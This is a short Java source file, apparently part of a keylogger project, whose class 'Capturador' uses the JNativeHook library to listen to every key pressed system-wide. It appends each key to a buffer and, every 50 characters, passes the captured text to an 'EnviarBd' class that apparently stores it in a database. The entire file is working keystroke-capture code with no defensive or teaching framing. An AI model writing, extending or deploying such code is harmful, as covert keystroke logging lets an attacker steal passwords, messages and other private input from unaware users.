package tech.leonam;

import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import tech.leonam.dao.EnviarBd;

public class Capturador implements NativeKeyListener {
    private String aSerEnviado = "";
    private int i = 0;
    public static final int numeroDeCaracteresASerEnviado = 50;

    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {

        var letra = NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode()).toLowerCase();
        aSerEnviado += letra;
        i++;
        if(i >= numeroDeCaracteresASerEnviado){
            new EnviarBd(aSerEnviado);
            aSerEnviado = " ";
            i = 0;
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {
    }
}
